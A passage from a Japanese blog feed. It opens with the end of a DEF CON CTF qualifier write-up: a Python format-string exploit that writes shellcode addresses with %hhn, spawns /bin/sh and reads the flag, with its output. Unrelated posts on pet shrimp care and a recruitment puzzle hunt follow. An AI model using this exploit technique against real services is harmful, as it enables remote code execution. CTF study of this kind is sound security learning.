</span><span class='line'>    <span class="o">+</span> <span class="s">&quot;</span><span class="si">%%%d</span><span class="s">c</span><span class="si">%%%d</span><span class="s">$hhn&quot;</span> <span class="o">%</span> <span class="p">((</span><span class="n">addr_shell</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">-</span> <span class="n">addr_shell</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">,</span> <span class="n">index</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> \
</span><span class='line'>    <span class="o">+</span> <span class="s">&quot;</span><span class="si">%%%d</span><span class="s">c</span><span class="si">%%%d</span><span class="s">$hhn&quot;</span> <span class="o">%</span> <span class="p">((</span><span class="n">addr_shell</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">-</span> <span class="n">addr_shell</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">,</span> <span class="n">index</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)</span> \
</span><span class='line'>    <span class="o">+</span> <span class="s">&quot;</span><span class="si">%%%d</span><span class="s">c</span><span class="si">%%%d</span><span class="s">$hhn&quot;</span> <span class="o">%</span> <span class="p">((</span><span class="n">addr_shell</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">-</span> <span class="n">addr_shell</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">,</span> <span class="n">index</span> <span class="o">+</span> <span class="mi">3</span><span class="p">)</span> \
</span><span class='line'>    <span class="o">+</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="c"># exploit</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;cat&lt;/home/babyecho/flag</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span> <span class="c"># capture the flag</span>
</span><span class='line'>    <span class="k">print</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8192</span><span class="p">))</span>
</span><span class='line'>    <span class="k">print</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8192</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span> <span class="n">__name__</span><span class="o">==</span><span class="s">&#39;__main__&#39;</span><span class="p">:</span>
</span><span class='line'>    <span class="n">exploit</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>実行結果は以下のとおりです。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">Reading</span> <span class="mi">13</span> <span class="nb">bytes</span>
</span><span class='line'>
</span><span class='line'><span class="p">[</span><span class="n">DEBUG</span><span class="p">]</span> <span class="n">Buffer</span> <span class="n">address</span> <span class="o">=</span> <span class="mh">0xffbf62bc</span>
</span><span class='line'>
</span><span class='line'><span class="n">Reading</span> <span class="mi">1023</span> <span class="nb">bytes</span>
</span><span class='line'>
</span><span class='line'><span class="err">彙ｿ…</span> <span class="err">拊ｿ…</span> <span class="err">枌ｿ…</span> <span class="err">歟ｿ…</span> <span class="n">j</span>
</span><span class='line'><span class="n">X</span><span class="err">儚</span><span class="n">h</span><span class="o">//</span><span class="n">shh</span><span class="o">/</span><span class="nb">bin</span><span class="err">峨</span><span class="mi">1</span><span class="err">ﾉﾍ</span><span class="o">^</span>\
</span><span class='line'><span class="err">…</span>
</span><span class='line'>
</span><span class='line'>                                                               <span class="err">…</span>
</span><span class='line'><span class="n">The</span> <span class="n">flag</span> <span class="ow">is</span><span class="p">:</span> <span class="mi">1</span><span class="n">s</span> <span class="mi">1</span><span class="n">s</span> <span class="n">th3r3</span> <span class="n">th3r3</span> <span class="nd">@n</span> <span class="nd">@n</span> <span class="mi">3</span><span class="n">ch0</span> <span class="mi">3</span><span class="n">ch0</span> <span class="mi">1</span><span class="n">n</span> <span class="mi">1</span><span class="n">n</span> <span class="n">h3r3</span> <span class="n">h3r3</span><span class="err">?</span> <span class="mi">3</span><span class="n">uoiw</span><span class="err">!</span><span class="n">T0</span><span class="o">*%</span>
</span></code></pre></td></tr></table></div></figure>


<p>FLAG:<code>1s 1s th3r3 th3r3 @n @n 3ch0 3ch0 1n 1n h3r3 h3r3? 3uoiw!T0*%</code></p>

<p>今回の攻撃手法もIPAによって丁寧に解説及び対策が掲載されているので、詳しく知りたい場合は参考に見てみるのも良いでしょう。</p>

<p><a href="http://www.ipa.go.jp/security/awareness/vendor/programmingv2/contents/c906.html">IPA ISEC　セキュア・プログラミング講座：C/C++言語編　第10章 著名な脆弱性対策：フォーマット文字列攻撃対策</a></p>

<h1>その他</h1>

<p>Coding Challengeという、問題サーバーからレジスタの初期状態と機械語の命令コードが送られてきて、その命令を実行したあとのレジスタの値を送り返すという問題も解いたのですが、違う問題でglibcのアップデートをした際にマシンがクラッシュし、スナップショットの状態に戻した際に消えてしまいました。
なのでコードがありません。</p>

<h2>問題文</h2>

<pre><code>meow

catwestern_631d7907670909fc4df2defc13f2057c.quals.shallweplayaga.me
</code></pre>

<p>解法としては、Pythonで以下のように処理するものを作成して実行しただけです。</p>

<ol>
<li>レジスタの初期状態と機械語命令コードを受信＆パースする</li>
<li>Cのソースコードを生成

<ol>
<li>命令コードをunsigned char型配列に突っ込む</li>
<li>その配列を関数ポインタに変換</li>
<li>mprotectで配列の領域を実行可能に変更</li>
<li>asm volatile経由でレジスタの初期状態を書き込む</li>
<li>関数ポインタを呼び出し実行</li>
<li>asm volatile経由で実行後のレジスタの値を読み出す</li>
<li>標準出力に出力</li>
</ol>
</li>
<li>gccでソースコードをコンパイル</li>
<li>生成したバイナリを実行し、出力を得る</li>
<li>出力を送信</li>
</ol>


<p>となっています。
途中、mprotectに関してみむらさんからアドバイスをいただき、解くことができました。</p>

<p><a href="http://mimumimu.net/blog/2011/11/17/c%E3%82%B3%E3%83%BC%E3%83%89%E4%B8%AD%E3%81%AB%E3%83%9E%E3%82%B7%E3%83%B3%E8%AA%9E%E3%82%92%E5%9F%8B%E3%82%81%E8%BE%BC%E3%82%93%E3%81%A7%E5%AE%9F%E8%A1%8C%E3%81%99%E3%82%8B%E3%80%82/">Cコード中にマシン語を埋め込んで実行する。 | みむらの手記手帳</a></p>

<p>FLAG: <code>Cats with frickin lazer beamz on top of their heads!</code></p>

<p>追記：flag獲得者のみむらさんによるWrite-upが公開されています。</p>

<p><a href="https://mimumimu.net/blog/2015/05/19/defcon-ctf-23-quals-catwestern/">DEFCON CTF 23 Quals – catwestern Writeup | みむらの手記手帳</a></p>

<h1>まとめ</h1>

<p>チーム全体で計19ポイントを獲得し、結果33位でした。1ポイントしか貢献できませんでしたが、大人数でお互い協力して問題を解く楽しさを味わえてとても有意義でした。
また、問題傾向がPwn寄りであることから、もっとPwnに関する実力をつけなければならないと再確認できた良い機会でした。
来年は5ポイントを目標に挑みたいと思います！</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[えびの水槽引越しと環境整備と飼育について]]></title>
    <link href="http://mzyy94.com/blog/2015/04/29/ebi-the-move/"/>
    <updated>2015-04-29T15:03:01+09:00</updated>
    <id>http://mzyy94.com/blog/2015/04/29/ebi-the-move</id>
    <content type="html"><![CDATA[<p>小さくてかわいいピクシーシュリンプ（以下、えび）</p>

<p>かわいいえび特集第2弾です。</p>

<p>2月の寒い時期を乗り越えたえびたちは月が変わり3月に引越しをしました。引越しとともにえびの飼育環境の見直しや飼育設備の調整を行ったので、まとめることにしました。</p>

<!-- more -->


<h1>えびのお引越し</h1>

<p>この小さなえびは先日紹介したように、小さな瓶に入った状態で購入し、サーバーの中で飼っていました。
しかしサーバーの中は卓上と比べて薄暗く、単方向からしか鑑賞できないので机の上に移動させようと思い、引越しさせることにしました。</p>

<h2>えびの住環境見直し</h2>

<p>机の上に移動させることを考え始めたとき、小さな瓶に入ったえびたちを見て思うことがいくつかありました。</p>

<ul>
<li>「狭くないかなぁ」</li>
<li>「ちょっと殺風景だなぁ」</li>
<li>「食べ物とか大丈夫かなぁ」</li>
</ul>


<p>観賞魚（えび）だとはいえ、一緒に暮らす生き物です。このまま小瓶の中で飼い続けるのはえび達に申し訳なく思い、住環境を見直すことにしました。</p>

<h3>新しい水槽</h3>

<p>狭さへのストレス増加を危惧し、まずは大きな水槽へと移すことにしました。とは言ったものの、本格的な大きな水槽ではなく、今よりも4ｰ5倍広いものを想定して入れ物を探してみました。
えびの遊泳を妨げぬように形状は円柱もしくは角丸に限定し、なおかつ高透明度なアクリル製の容器を探していると、無印良品で良さそうなものを発見しました。</p>

<p><img src="http://img.muji.net/img/item/4934761479781_400.jpg" alt="アクリルポット 約直径８×高さ１１ｃｍ" /></p>

<p><a href="http://www.muji.net/store/cmdty/detail/4934761479781">アクリルポット 約直径８×高さ１１ｃｍ | 無印良品ネットストア</a></p>

<p>小瓶の4倍程度の大きさで透明度が高く、しっかりとした作りなので、えび水槽としても十分であると思い購入しました。</p>

<p>大きな水槽に移し替えるためには当然追加の水が必要となります。
このえび達は塩分濃度の低い海水、すなわち汽水で生活しているとのことなので、適切な濃度の汽水を用意しないといけません。
Amazon等で売ってる人工海水キットと比重計を買って汽水を作るのが一般的ですが、実はえびの購入時にマイクロウォーターなる専用の追加の汽水をいっしょに買っていたので、それをあたらしい水槽に追加することでより広い空間を泳げるようにしました。</p>

<p>大きな水槽に移すに伴いもう一つ必要となるものが、水槽に敷く砂利です。
えびは水質にとても敏感で、砂利の種類によっては水が弱アルカリ性に傾くことがあるようなので、影響が少ないであろうガラス製の人工砂を購入しました。
水槽に入れてから気づいたのですが、赤色の砂はえびの色とかぶってしまい、視認性が落ちます。</p>

<p><a href="http://click.linksynergy.com/link?id=fUSw4lglgFk&amp;offerid=329184.179123&amp;type=2&amp;murl=http%3A%2F%2Fwww.shopping-charm.jp%2FItemDetail.aspx%3FitemId%3D179123"><img src="http://www.shopping-charm.jp/pic/179/179123-1.jpg" alt="クリスタルグラスサンド レッド／クリアー（約６０ｇ）" /></a></p>

<ul>
<li>Charm: <a href="http://click.linksynergy.com/link?id=fUSw4lglgFk&amp;offerid=329184.179123&amp;type=2&amp;murl=http%3A%2F%2Fwww.shopping-charm.jp%2FItemDetail.aspx%3FitemId%3D179123">クリスタルグラスサンド レッド／クリアー（約６０ｇ）</a></li>
<li>Amazon: <a href="http://www.amazon.co.jp/gp/product/B00U5OXGEI/ref=as_li_ss_tl?ie=UTF8&amp;camp=247&amp;creative=7399&amp;creativeASIN=B00U5OXGEI&amp;linkCode=as2&amp;tag=mzyy-22">クリスタルグラスサンド　レッド／クリアー（約６０ｇ）</a></li>
</ul>


<h3>えびの隠れ家</h3>

<p>引越しついでに殺風景だった水槽を彩るべくいろいろと必要なものを揃えました。</p>

<p>一番初めに準備したのはえびの隠れ家です。今までの小瓶には枝が1つと藻が1本入っているだけで、おちおちと休まることのできない環境だったので隠れ家を用意してあげようと思い立ちました。
えび用の隠れ家は何種類も売っていたのですが、どれもこの小さなえびには大きすぎるので、稚えび用の隠れ家を購入しました。</p>

<p><a href="http://www.amazon.co.jp/gp/product/B00R493S22/ref=as_li_ss_il?ie=UTF8&amp;camp=247&amp;creative=7399&amp;creativeASIN=B00R493S22&amp;linkCode=as2&amp;tag=mzyy-22"><img src="http://ws-fe.amazon-adsystem.com/widgets/q?_encoding=UTF8&amp;ASIN=B00R493S22&amp;Format=_SL250_&amp;ID=AsinImage&amp;MarketPlace=JP&amp;ServiceVersion=20070822&amp;WS=1&amp;tag=mzyy-22" alt="稚エビの隠れ家" /></a></p>

<ul>
<li>Amazon: <a href="http://www.amazon.co.jp/gp/product/B00R493S22/ref=as_li_ss_tl?ie=UTF8&amp;camp=247&amp;creative=7399&amp;creativeASIN=B00R493S22&amp;linkCode=as2&amp;tag=mzyy-22">ウォーターエンジニアリング ベビー ビー シュリンプ シェルター (稚エビの隠れ家) 20個入り</a></li>
</ul>


<p>この隠れ家は明かりが十分にさす作りなので、暗い隠れ家も必要かと思い、エビ土管も購入しました。
これもサイズはいろいろとあったのですが、一番小さいものを選択しました。</p>

<p><a href="http://click.linksynergy.com/link?id=fUSw4lglgFk&amp;offerid=329184.87347&amp;type=2&amp;murl=http%3A%2F%2Fwww.shopping-charm.jp%2FItemDetail.aspx%3FitemId%3D87347"><img src="http://www.shopping-charm.jp/pic/873/87347-1.jpg" alt="エビ土管 Ｓタイプ ５本入り" /></a></p>

<ul>
<li>Charm: <a href="http://click.linksynergy.com/link?id=fUSw4lglgFk&amp;offerid=329184.87347&amp;type=2&amp;murl=http%3A%2F%2Fwww.shopping-charm.jp%2FItemDetail.aspx%3FitemId%3D87347">エビ土管 Ｓタイプ ５本入り</a></li>
<li>Amazon: <a href="http://www.amazon.co.jp/gp/product/B00GTIL2PO/ref=as_li_ss_tl?ie=UTF8&amp;camp=247&amp;creative=7399&amp;creativeASIN=B00GTIL2PO&amp;linkCode=as2&amp;tag=mzyy-22">ミニテム エビ土管 Sタイプ</a></li>
</ul>


<h3>水草</h3>

<p>殺風景だった水槽も隠れ家によってだいぶ賑やかになってきました。
このえびはコケや藻やバクテリアを食して生きているとのことですが、瓶には目に見えないほど小さな藻が入っているだけだったので、彩りも兼ねてウィローモスを追加しました。
餌にも足場にもなる優秀な水草です。</p>

<p><a href="http://click.linksynergy.com/link?id=fUSw4lglgFk&amp;offerid=329184.472562&amp;type=2&amp;murl=http%3A%2F%2Fwww.shopping-charm.jp%2FItemDetail.aspx%3FitemId%3D472562"><img src="http://www.shopping-charm.jp/pic/472/472562-1.jpg" alt="ウィローモス" /></a></p>

<ul>
<li>Charm: <a href="http://click.linksynergy.com/link?id=fUSw4lglgFk&amp;offerid=329184.472562&amp;type=2&amp;murl=http%3A%2F%2Fwww.shopping-charm.jp%2FItemDetail.aspx%3FitemId%3D472562">（水草）ウィローモスｓｐ．（無農薬）（１カップ）　北海道航空便要保温</a></li>
<li>Amazon: <a href="http://www.amazon.co.jp/gp/product/B00UF49ZRK/ref=as_li_ss_tl?ie=UTF8&amp;camp=247&amp;creative=7399&amp;creativeASIN=B00UF49ZRK&amp;linkCode=as2&amp;tag=mzyy-22">（水草）ウィローモスｓｐ．（無農薬）（１カップ）　北海道航空便要保温</a></li>
</ul>


<p>ウィローモスだけでも良かったのですが、アクアリウムショップに立ち寄った時に耐塩性マングローブの一種であるメヒルギを見つけたのでこれも購入し、水槽へと入れることにしました。</p>

<p><a href="http://click.linksynergy.com/link?id=fUSw4lglgFk&amp;offerid=329184.47168&amp;type=2&amp;murl=http%3A%2F%2Fwww.shopping-charm.jp%2FItemDetail.aspx%3FitemId%3D47168"><img src="http://www.shopping-charm.jp/pic/471/47168-1.jpg" alt="メヒルギ" /></a></p>

<ul>
<li>Charm: <a href="http://click.linksynergy.com/link?id=fUSw4lglgFk&amp;offerid=329184.47168&amp;type=2&amp;murl=http%3A%2F%2Fwww.shopping-charm.jp%2FItemDetail.aspx%3FitemId%3D47168">（観葉）メヒルギ（雌蛭木）の種（１本）北海道・九州・沖縄航空便要保温</a></li>
<li>Amazon: <a href="http://www.amazon.co.jp/gp/product/B00UF44M5U/ref=as_li_ss_tl?ie=UTF8&amp;camp=247&amp;creative=7399&amp;creativeASIN=B00UF44M5U&amp;linkCode=as2&amp;tag=mzyy-22">（観葉）メヒルギ（雌蛭木）の種（１本）北海道・九州・沖縄航空便要保温</a></li>
</ul>


<p>物がそろったらいざ引越しです。小瓶内の水温と新しい水槽の水温がほぼ同じになるよう調節して、お互いの水をピペットで交換しつつ水質を近くしていき、水の準備をします。
そして、えびを瓶の中になだらかに流し込んであげて、引越しは完了です。</p>

<h4>Before</h4>

<p><img src="http://mzyy94.com/blog/resources/images/2015/04/29/before-shrimpbottle.jpg" alt="before" /></p>

<h4>After</h4>

<p><img src="http://mzyy94.com/blog/resources/images/2015/04/29/after-ebipot.jpg" alt="after" /></p>

<h1>えび飼育にあったほうがいいもの</h1>

<p>引越しをしてからかれこれ1ヶ月以上元気に育っています。飼育していて、あるとよいと気づいて購入した物がいくつかあったので紹介します。</p>

<h2>足し水</h2>

<p>密閉容器で飼育しているわけではないので、大気中に水分が蒸発していき水が減っていきます。
小瓶に付属していた飼い方説明書きには、減ってきたら専用のマイクロウォーターを追加してくださいと書いてあったのですが、汽水濃度が上がり続けることが心配になりました。
そこで、人工海水の作成時にも用いられる、海洋深層水をろ過したRO水を購入し、減った時には追加するようにしています。今回購入したRO水はもともと飲料水として販売している物なので、試しにコーヒーを淹れてみた所、すこし香りが増したような味わいになりました。</p>

<p><img src="http://ws-fe.amazon-adsystem.com/widgets/q?_encoding=UTF8&amp;ASIN=B004ABND0Y&amp;Format=_SL250_&amp;ID=AsinImage&amp;MarketPlace=JP&amp;ServiceVersion=20070822&amp;WS=1&amp;tag=mzyy-22" alt="赤穂化成 純水 2000ml×6本" /></p>

<ul>
<li>Amazon: <a href="http://www.amazon.co.jp/gp/product/B004ABND0Y/ref=as_li_ss_tl?ie=UTF8&amp;camp=247&amp;creative=7399&amp;creativeASIN=B004ABND0Y&amp;linkCode=as2&amp;tag=mzyy-22">赤穂化成 純水 2000ml×6本</a></li>
</ul>


<h2>エビ用のえさ</h2>

<p>えび達がウィローモスをつまつましている姿はたいへんかわいらしいのですが、心配性なのでお腹を空かせていないかとても気になりました。
えび用のえさは何十種類もあるのでどれがいいのかさっぱりでしたが、小さい顆粒で水に溶け出しにくい物をあげることにしました。
小さい顆粒と言っても一般的な鑑賞えびから見たら小さいということであって、この子たちには手で持つことができないサイズです。1粒を4つに割ってあげて、週に2回あげるようにしています。えさをあげる際は、食べ終わったらピペットで食べ残しを取り除いてあげないと水質が変化してしまったり、えび達に悪影響を与えかねないので注意が必要です。</p>

<p><a href="http://click.linksynergy.com/link?id=fUSw4lglgFk&amp;offerid=329184.65799&amp;type=2&amp;murl=http%3A%2F%2Fwww.shopping-charm.jp%2FItemDetail.aspx%3FitemId%3D65799"><img src="http://www.shopping-charm.jp/pic/657/65799-2.jpg" alt="ヌマエビの主食" /></a></p>

<ul>
<li>Charm: <a href="http://click.linksynergy.com/link?id=fUSw4lglgFk&amp;offerid=329184.65799&amp;type=2&amp;murl=http%3A%2F%2Fwww.shopping-charm.jp%2FItemDetail.aspx%3FitemId%3D65799">コメット ヌマエビの主食 沈下性 ４０ｇ</a></li>
<li>Amazon: <a href="http://www.amazon.co.jp/gp/product/B0051RIXU6/ref=as_li_ss_tl?ie=UTF8&amp;camp=247&amp;creative=7399&amp;creativeASIN=B0051RIXU6&amp;linkCode=as2&amp;tag=mzyy-22">ヌマエビの主食 40g</a></li>
</ul>


<h1>小さいえび飼育まとめ</h1>

<ul>
<li><strong>隠れ家は好みで</strong></li>
</ul>


<p>えびに隠れ家が必ず必要であるという確たる文献が見つからなかったので、殺風景だなと思ったら入れてあげる程度でいいかと思います。</p>

<ul>
<li><strong>水草は汽水でも生きる物を</strong></li>
</ul>


<p>当たり前のことですが、汽水に入れるので淡水でしか生息できない水草は枯れてしまい、水質を悪くし、えびのえさにすらならないのでご注意を。</p>

<ul>
<li><strong>汽水で生息</strong></li>
</ul>


<p>汽水の中でも比較的濃度の低い汽水で生活しているようです。また、餌やりしない場合は、水替えやフィルターなしで良いとのことです。人工海水キットで汽水を作る際は比重計とRO水の準備を忘れずに。</p>

<ul>
<li><strong>えさは不要</strong></li>
</ul>


<p>水槽に張り付いてコケを食べたり水草をつまつまする姿が見えるので追加でえさを入れなくても元気です。どうしても食べさせてあげたい時は小さめの物を。また、残飯を確実に回収すること。</p>

<ul>
<li><strong>水温は22℃前後</strong></li>
</ul>


<p>15℃以下30℃以上は生き辛いとのことなので、間をとって22℃を目標として飼育しています。今の所元気な姿が伺えます。</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[小さなえびを飼い始めて2ヶ月が過ぎた]]></title>
    <link href="http://mzyy94.com/blog/2015/04/26/no-shrimp-no-life/"/>
    <updated>2015-04-26T23:46:19+09:00</updated>
    <id>http://mzyy94.com/blog/2015/04/26/no-shrimp-no-life</id>
    <content type="html"><![CDATA[<p>先日、久々にアイコンを大幅に変更しました。
MacBook Airとコーヒーと犬が描かれていたアイコンをここ数年使っていたのですが、
先月頭に起きた<a href="http://mzyy94.com/blog/2015/03/06/yuzu-trouble/">とある一件</a>のために柚子胡椒禁止アイコンが追加されるマイナーバージョンアップがあったくらいです。</p>

<blockquote class="twitter-tweet" lang="ja"><p>柚子胡椒 禁止アイコン <a href="http://t.co/FKXJYy96GN">pic.twitter.com/FKXJYy96GN</a></p>&mdash; プロ生ちゃん（暮井 慧） (@pronama) <a href="https://twitter.com/pronama/status/573812508881870849">2015, 3月 6</a></blockquote>


<p>そんなこんなでずっと同じアイコンを使っていたのですが、2月の中旬にえびを飼い始め、えびのことをたくさん呟き始めてきているのにアイコンにえびが写っていないのはいかがなものかと思っていたので、変更することにしました。そんなえびの話をします。</p>

<!-- more -->


<h1>えびとの出会い</h1>

<p>去る2015/02/15に東京スカイツリータウンへ行ったときのこと。ソラマチの中をブラブラとしていると、いろいろな雑貨を扱っているブースを見つけたので興味本位で立ち寄ってみました。ふと目に留まったのが手のひらサイズの小瓶。中に液体が入っているのが遠目でなんとか確認できるというものでしたが、近付いてみてびっくり、小さなかわいいえびがふわふわと泳いでいたのです。一円玉よりはるかに小さいえびがふわふわ漂う姿を目の当たりにした時、ビビッときました。一目惚れです。目尻が下がり、ドキドキしてしてました。しかし、その場ではすぐに買わず、ソラマチを再度ブラブラし始めました。</p>

<ul>
<li>餌やり不要</li>
<li>水替え不要</li>
<li>瓶のまま飼育可能</li>
<li>20℃前後の環境で飼育</li>
</ul>


<p>ブースに貼ってあったPopには確かこんなことが書いてありました。
果たしてちゃんと飼えるのだろうか、買われたことでえびたちは不幸になりやしないか。。などと考え1時間ほどソラマチを回って再度えびの前に戻ってきました。</p>

<p><strong>「幸せにしてあげるぞ！」</strong>そう意気込んで、ブースに来た時に最初に目が合ったえびのいる瓶を購入しました。</p>

<p><strong>2015/04/29追記：</strong>人気商品なためか、今月購入店を訪れた所、すでに売り切れていました。オンライン販売で入手できるかもです：<a href="http://www.love-marimo.com/shop/shop.html">まりも倶楽部通販</a></p>

<h1>えびの越冬</h1>

<p>飼い始めたえびは<em>ピクシーシュリンプ</em>（もしくはスカーレットシュリンプ、もしくはホロホロシュリンプ）という名の汽水に生息するとても小さなえびで、ハワイ原産とのことです。購入した小瓶には4匹入っていました。</p>

<p>小瓶に付属の飼い方説明書きには、15℃以下、30℃以上では生きていけないと記載がありました。購入した2月中旬の気温は15℃を下回っていたので、温める必要に迫られます。一人暮らしでハロゲンヒーターとコタツしか暖房器具がなく、どれも部屋中をあたためるのには不向きであり、かつ小瓶一つを温め続けるのも不可能であったため、違う熱源を利用しました。</p>

<blockquote class="twitter-tweet" lang="ja"><p>冬場の寒さから守るため、サーバーの中でエビを飼い始めました <a href="http://t.co/kZpvz90OPw">pic.twitter.com/kZpvz90OPw</a></p>&mdash; えび over HTTP/2 IPv6 (@mzyy94) <a href="https://twitter.com/mzyy94/status/566981294739820547">2015, 2月 15</a></blockquote>


<p>大抵の家庭にあるもう一つの暖房器具であるメディアストリーミングサーバーの中にすっぽりと収まったので、その中で冬の夜の寒い時間をしっかりと温まってもらおうとしました。
思惑は期待通りで、20℃前後の空間を作り上げることができ、2月の寒い時期を元気にすごしてくれました。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/04/26/shrimp-in-the-server.jpg" alt="shrimp-in-the-server" /></p>

<h1>えびかわいいのでえび特集します</h1>

<p>ということで、えびかわいいので今週の記事はえび特集です。
3月になってからのえびの引越しやえびの飼育方法、えびかわいい動画撮影などの技術的な記事を書きます。
乞うご期待。</p>

<script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[ネットエージェント最終面接問題 Write-up エクストリームCTF編]]></title>
    <link href="http://mzyy94.com/blog/2015/04/16/netagent-mondai10/"/>
    <updated>2015-04-16T00:13:43+09:00</updated>
    <id>http://mzyy94.com/blog/2015/04/16/netagent-mondai10</id>
    <content type="html"><![CDATA[<p>ネットエージェントのいきなり最終面接問題を解いたのでWrite-upです。</p>

<ul>
<li><a href="http://www.netagent.co.jp/recruit/newgraduates_2016.html">2016年度 新卒採用｜ネットエージェント株式会社</a></li>
</ul>


<p>これまでmondai1からmondai9までは、mondaiとOS XやLinux、Windowsマシンが手元にあれば解く事ができていました。
しかしmondai10はそうはいきません。mondaiが手元にないのです。mondaiを入手しなければいけないのです。
某所で10分で解けたと言っていた人は、きっと某せんせーみたいにマッハ20で移動できるのでしょう。</p>

<p>ところで、こんな楽しい体験をさせてくれたmondaiを少しでもたくさんの人に知ってもらおうと、学内のLT大会で以下のように発表してきました。</p>

<iframe src="//www.slideshare.net/slideshow/embed_code/47019316" width="425" height="355" frameborder="0" marginwidth="0" marginheight="0" scrolling="no" style="border:1px solid #CCC; border-width:1px; margin-bottom:5px; max-width: 100%;" allowfullscreen> </iframe>


<p> <div style="margin-bottom:5px"> <strong> <a href="//www.slideshare.net/mzyy94/ctf-coinslt" title="CTFの話 - coinsLT #10" target="_blank">CTFの話 - coinsLT #10</a> </strong> from <strong><a href="//www.slideshare.net/mzyy94" target="_blank">Yuki Mizuno</a></strong> </div></p>

<p>この発表では、この記事の内容から抜粋する形で、最後のmondai10を解く楽しさと、それによって得た経験を紹介してきました。
よろしければご覧になってみてください。</p>

<p>さて、一昨々日から始まったネットエージェント最終面接問題のWrite-upもこれで最終回です。
<a href="http://mzyy94.com/blog/2015/04/15/netagent-mondai7-9/">昨日のmondai9のWrite-up</a>に続き、最後のmondai10のWrite-upです。</p>

<!-- more -->


<h1>mondai10</h1>

<p>mondai9でマウントしたmondai10.tcには9枚の写真とmondai10.txtがありました。mondai10.txtには以下のように記載がありました。</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>関東２ヶ所、関西２ヶ所のそれぞれの箇所にSDカードに最後の問題を隠した。今までのヒントと写真から位置を割り出せ。
</span><span class='line'>
</span><span class='line'>各地先着１名
</span><span class='line'>ヒント：石の下のミンティア</span></code></pre></td></tr></table></div></figure>


<p>関東に住んでいるので、関東のSDカードをゲットしに行こうと思いました。
関東の2ヶ所はkanto1・kanto2と呼ばれ、どちらにしようか迷っていると、kanto2がゲットを狙われているとの情報を得たのでkanto1に行くことにしました。</p>

<h2>今までのヒント</h2>

<p>これまでの問題を解いていて、途中でhint[数字].txtといったファイルが幾つか一緒に出てきました。
このhintに書かれているkanto1のヒントは以下の6つでした。</p>

<ul>
<li>com.ruckygames.gunmaapps</li>
<li>ひもかわうどん</li>
<li>百足</li>
<li>×Fe</li>
<li>!△</li>
<li>ヤマヒゲナガケンミジンコ</li>
</ul>


<p>1つ目のヒントはアプリケーションBundle IDで、<strong>ぐんまのやぼう</strong>のものでした。2つ目のヒントのひもかわうどんは、群馬県の桐生名物とのことです。
この2つから群馬県のとある場所に隠されているということが想像つきます。</p>

<p>3つ目のヒントの百足と群馬県をセットにしてGoogle検索してみると、次のサイトが上位にヒットします。</p>

<p><a href="http://akagi-yama.jp/archives/358">神戦「赤城と日光二荒山神戦」 | 群馬県赤城山ポータルサイト</a></p>

<p>群馬県赤城山の神様が大ムカデとのことです。これによって群馬県赤城山に隠されている線が浮上します。</p>

<p>4つ目のヒントは×Fe（※エックスではなくバツ）ですが、さっぱりわかりません。そのまま見るに、鉄(Fe)ではない、ということでしょうか。</p>

<p>5つ目のヒントは!△で意味するところは、山頂にはない、もしくは、三角点付近ではない、ということでしょうか。これまたよくわかりません。</p>

<p>6つ目のヒントはヤマヒゲナガケンミジンコで、Google検索してみるとミジンコ画像サイトばかりヒットしてよくわかりませんでした。</p>

<p>これらのヒントを元にわかったことは、<strong>群馬県の赤城山</strong>に隠されているということです。
kanto1に関する画像がまだ確認してないので見てみます。
kanto1_1.jpgとkanto1_2.jpgのファイル情報に撮影場所の手がかりがあるかもと期待を込め、メタ情報を見てみます。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/04/16/exif-infos.png" alt="exif-infos.png" /></p>

<p>予想通り、SDカードを隠した場所のGPSの座標情報がEXIFに含まれているようです。OS Xのプレビュー.appで詳細情報を開いて、マップ.appにその地点を表示させてみました。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/04/16/apple-map.png" alt="apple-map.png" /></p>

<p>ヒントから導いた通り、隠されている場所は赤城山でまちがいないようです。</p>

<p>早速、赤城山への行き方を調べてみます。</p>

<p><a href="http://akagi-yama.jp/access">アクセス | 群馬県赤城山ポータルサイト</a></p>

<p>公共交通機関で行く方法として、電車に乗って前橋駅もしくは中央前橋駅へ行き、そこから赤城山行きのバスに乗ればよいと示されていました。
